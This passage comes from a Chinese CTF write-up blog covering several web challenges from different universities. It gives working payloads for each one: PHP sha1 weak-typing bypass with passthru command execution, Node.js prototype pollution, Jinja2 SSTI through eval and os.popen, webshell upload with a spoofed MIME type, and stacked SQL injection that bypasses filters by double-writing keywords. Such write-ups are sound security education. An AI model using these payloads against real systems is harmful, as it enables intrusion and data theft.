class="hljs-string">&quot;很简单的，很快就拿flag了~_~&lt;/br&gt;&quot;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;百度就能搜到的东西&lt;/br&gt;&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;easy 不 easy ,baby 真 baby,都是玩烂的东西，快拿flag！！！&lt;/br&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<p>弱类型，sha1绕过+rce</p>
<p>payload:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">index</span>.php?code=passthru(<span class="hljs-string">&quot;nl%09/fla*&quot;</span>);<br><span class="hljs-attribute">post</span>:<br><span class="hljs-attribute">a</span>=<span class="hljs-number">0</span>a&amp;key1[]=<span class="hljs-number">0</span>&amp;key2[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744860.png" srcset="/img/loading.gif" lazyload alt="image-20221112230110346"></p>
<h2 id="快乐三消-河南理工大学"><a href="#快乐三消-河南理工大学" class="headerlink" title="快乐三消-河南理工大学"></a>快乐三消-河南理工大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744861.png" srcset="/img/loading.gif" lazyload alt="image-20221119102232201"></p>
<p>git泄露，扫描出来一堆文件，还有一个登录界面。</p>
<p>访问phpinfo.php即可得到flag。</p>
<h2 id="babynode-云南大学"><a href="#babynode-云南大学" class="headerlink" title="babynode-云南大学"></a>babynode-云南大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744862.png" srcset="/img/loading.gif" lazyload alt="image-20221119102302714"></p>
<p>源码：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json">app.post(&#x27;/&#x27;<span class="hljs-punctuation">,</span> function(req<span class="hljs-punctuation">,</span> res) <span class="hljs-punctuation">&#123;</span><br>var flag=&#x27;flag&#x27;;<br>var admin = <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>;<br>let user = <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>;<br>try<span class="hljs-punctuation">&#123;</span>copy(user<span class="hljs-punctuation">,</span>req.body);<span class="hljs-punctuation">&#125;</span> <br>catch (error)<br><span class="hljs-punctuation">&#123;</span><br>	res.send(<span class="hljs-string">&quot;copy error&quot;</span>);<br>	return;<br><span class="hljs-punctuation">&#125;</span><br>if(admin.id===&#x27;unctf&#x27;)<br><span class="hljs-punctuation">&#123;</span><br>	res.end(flag);<br><span class="hljs-punctuation">&#125;</span><br>else<br><span class="hljs-punctuation">&#123;</span><br>	return res.end(<span class="hljs-string">&quot;error&quot;</span>);<br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br>)<br></code></pre></td></tr></table></figure>

<p>nodejs原型链污染，<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236182#h3-10">参考</a>，没玩过，以后有空补上原理</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">copy</span>(<span class="hljs-keyword">user</span>,req.body);<br></code></pre></td></tr></table></figure>

<p>利用这里可实现原型链污染，使得<code>admin</code>继承<code>Object.prototype</code></p>
<p>payload:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;unctf&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744863.png" srcset="/img/loading.gif" lazyload alt="image-20221115224045563"></p>
<p>content-type记得改为json</p>
<h2 id="easy-ssti-金陵科技学院"><a href="#easy-ssti-金陵科技学院" class="headerlink" title="easy ssti-金陵科技学院"></a>easy ssti-金陵科技学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744864.png" srcset="/img/loading.gif" lazyload alt="image-20221119102430915"></p>
<p>只过滤了class的SSTI</p>
<p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string, redirect, url_for<br><span class="hljs-keyword">import</span> re<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params">&amp;<span class="hljs-comment">#34;/&amp;#34;)</span></span></span><br><span class="hljs-params"><span class="hljs-meta"><span class="hljs-keyword">def</span> home(<span class="hljs-params"></span>):</span></span><br><span class="hljs-params"><span class="hljs-meta">	<span class="hljs-keyword">return</span> render_template(<span class="hljs-params">&amp;<span class="hljs-comment">#34;index.html&amp;#34;)</span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">@app.route(<span class="hljs-params">&amp;<span class="hljs-comment">#39;/register&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;])</span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"><span class="hljs-keyword">def</span> chall(<span class="hljs-params"></span>):</span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">	<span class="hljs-keyword">if</span> request.method == &amp;<span class="hljs-comment">#34;POST&amp;#34;:</span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">		name = request.form[&amp;<span class="hljs-comment">#39;user&amp;#39;]</span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">		<span class="hljs-keyword">if</span> name.find(<span class="hljs-params">&amp;<span class="hljs-comment">#39;class&amp;#39;)!=-1:</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">			<span class="hljs-keyword">return</span> render_template(<span class="hljs-params">&amp;<span class="hljs-comment">#34;warning.html&amp;#34;)</span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">		template = &amp;<span class="hljs-comment">#39;&amp;#39;&amp;#39;</span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;html&amp;gt; </span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;恭喜你&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt; </span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;body&amp;gt; &amp;lt;center&amp;gt; </span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;h1&amp;gt;恭喜你登录进来了&amp;lt;/h1&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;h3&amp;gt;flag就在 &amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    我草 我flag呢 &amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    flag，到底应该如何实现。 flag，到底应该如何实现。  &amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    要想清楚，flag，到底是一种怎么样的存在。 那么， flag因何而发生?这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 &amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    莎士比亚在不经意间这样说过，本来无望的事，大胆尝试，往往能成功。 &amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    这启发了我， 我们不得不面对一个非常尴尬的事实，那就是， 笛卡儿曾经说过，阅读一切好书如同和过去最杰出的人谈话。 &amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    这句话语虽然很短，但令我浮想联翩。&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    我认为， 海贝尔在不经意间这样说过，人生就是学校。&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    在那里，与其说好的教师是幸福，不如说好的教师是不幸。&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    我希望诸位也能好好地体会这句话。 博在不经意间这样说过，一次失败，只是证明我们成功的决心还够坚强。 维我希望诸位也能好好地体会这句话。&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    现在，解决flag的问题，是非常非常重要的。 所以， 我们都知道，只要有意义，那么就必须慎重考虑。&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    所以， 既然如何， flag，发生了会如何，不发生又会如何。 &amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/center&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;center&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    &amp;lt;h4&amp;gt;你好 %s&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    找什么flag玩玩游戏吧，ctf也就图一乐&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    我知道你很急，但是你先别急&amp;lt;br&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    虽然你找不到flag,但是也许你可以点点下面的按钮祝福我早日脱单&amp;lt;br&amp;gt;&amp;lt;/h4&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">    &amp;lt;button <span class="hljs-built_in">id</span>=&amp;<span class="hljs-comment">#34;text-button&amp;#34;&amp;gt;&amp;lt;p id=&amp;#34;text&amp;#34;&amp;gt;单击祝福出题人早日脱单，让世界充满爱&amp;lt;/p&amp;gt;&amp;lt;/button&amp;gt;</span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;style&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"><span class="hljs-comment">#text-button &#123;</span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"> display: block;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"> cursor: pointer;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"> width: 160px;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"> text-align: center;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"> border: 1px solid <span class="hljs-comment">#232323;</span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&#125;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/style&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;table border=&amp;<span class="hljs-comment">#39;1&amp;#39; cellpadding=&amp;#39;10&amp;#39;&amp;gt;</span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;tr&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;td&amp;gt;&amp;lt;p <span class="hljs-built_in">id</span>=&amp;<span class="hljs-comment">#34;tishi&amp;#34;&amp;gt;就TM你不点是吧&amp;lt;/p&amp;gt;&amp;lt;/h3&amp;gt;</span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/tr&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/table&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;script&amp;gt;</span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">document.getElementById(<span class="hljs-params">&amp;<span class="hljs-comment">#34;text-button&amp;#34;).onclick = function() &#123;</span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">document.getElementById(<span class="hljs-params">&amp;<span class="hljs-comment">#34;tishi&amp;#34;).innerHTML = &amp;#34;好好好，我是willing，谢谢你陌生人，为了感谢你，我告诉你flag就在flag.txt&amp;#34;;</span></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&#125;;</span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/script&amp;gt;</span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/center&amp;gt;</span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/body&amp;gt;</span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">&amp;lt;/html&amp;gt;</span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">		&amp;<span class="hljs-comment">#39;&amp;#39;&amp;#39; % name</span></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">		<span class="hljs-keyword">return</span> render_template_string(<span class="hljs-params">template</span>)</span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta"><span class="hljs-keyword">if</span> __name__ == &amp;<span class="hljs-comment">#34;__main__&amp;#34;:</span></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">	app.debug = <span class="hljs-literal">True</span></span></span></span></span></span></span></span></span><br><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-params"><span class="hljs-meta">	app.run(<span class="hljs-params">port=<span class="hljs-number">5000</span></span>)</span></span></span></span></span></span></span></span><br></code></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">user=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x.__init__.__globals__</span>[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml">&amp;pwd=123456</span><br></code></pre></td></tr></table></figure>

<p>flag藏在env里</p>
<h2 id="302与深大-深圳大学"><a href="#302与深大-深圳大学" class="headerlink" title="302与深大-深圳大学"></a>302与深大-深圳大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744865.png" srcset="/img/loading.gif" lazyload alt="image-20221119102443817"></p>
<p>bp抓包打</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744866.png" srcset="/img/loading.gif" lazyload alt="image-20221113143048489"></p>
<p>flag在env里</p>
<h2 id="easy-upload-云南警官学院"><a href="#easy-upload-云南警官学院" class="headerlink" title="easy_upload-云南警官学院"></a>easy_upload-云南警官学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744867.png" srcset="/img/loading.gif" lazyload alt="image-20221118210549016"></p>
<p>上传shell.php，改mime为image&#x2F;png</p>
<p>接着执行命令</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-built_in">flag</span>*<br></code></pre></td></tr></table></figure>

<p>找到</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/home/</span>ctf/flag<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744868.png" srcset="/img/loading.gif" lazyload alt="image-20221113144742428"></p>
<p>cat flag</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744869.png" srcset="/img/loading.gif" lazyload alt="image-20221113144811877"></p>
<h2 id="我太喜欢bilibili大学啦–中北大学"><a href="#我太喜欢bilibili大学啦–中北大学" class="headerlink" title="我太喜欢bilibili大学啦–中北大学"></a>我太喜欢bilibili大学啦–中北大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744870.png" srcset="/img/loading.gif" lazyload alt="image-20221118203614363"></p>
<p>打开就是phpinfo()送flag</p>
<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744871.png" srcset="/img/loading.gif" lazyload alt="image-20221113145205884"></p>
<h2 id="世界和平-西南科技大学"><a href="#世界和平-西南科技大学" class="headerlink" title="世界和平-西南科技大学"></a>世界和平-西南科技大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744872.png" srcset="/img/loading.gif" lazyload alt="image-20221119102505365"></p>
<p>堆叠注入</p>
<p>被过滤的明文会回显信息</p>
<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">其实台下的观众就我一个，其实我也看出你有点不舍。是否还值得...<br></code></pre></td></tr></table></figure>

<p>，用大写绕过会被替换为空，所以大写+双写绕过</p>
<p>payload:</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">0</span>;SESETT <span class="hljs-keyword">@a</span>=<span class="hljs-number">0</span>x73656c656374202a2066726f6d20466c6167;PREPPREPAREARE ark FRFROMOM <span class="hljs-keyword">@a</span>;execute ark;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744873.png" srcset="/img/loading.gif" lazyload alt="image-20221114112151287"></p>
<p>或者</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">query</span><span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-comment">;show columns FRFROMOM FlFlagag;</span><br><span class="hljs-attribute">query</span><span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-comment">;SELSELECTECT FlFlagag FRFROMOM FlFlagag;</span><br></code></pre></td></tr></table></figure>



<h2 id="Sqlsql-中国人民公安大学"><a href="#Sqlsql-中国人民公安大学" class="headerlink" title="Sqlsql-中国人民公安大学"></a>Sqlsql-中国人民公安大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744874.png" srcset="/img/loading.gif" lazyload alt="image-20221119102519457"></p>
<p>也是堆叠注入</p>
<p>给了源码附件，审计发现，所有地方都对username和studentid两个字段的输入进行了过滤</p>
<p>使用函数如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addslashes_deep</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$value</span>) ? <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;addslashes_deep&#x27;</span>, <span class="hljs-variable">$value</span>): <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>addslashes进行转义，并且</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$mysqli</span>,<span class="hljs-string">&quot;set names utf8&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>排除宽字节（我觉得应该没了），最后在index.php发现存在漏洞</p>
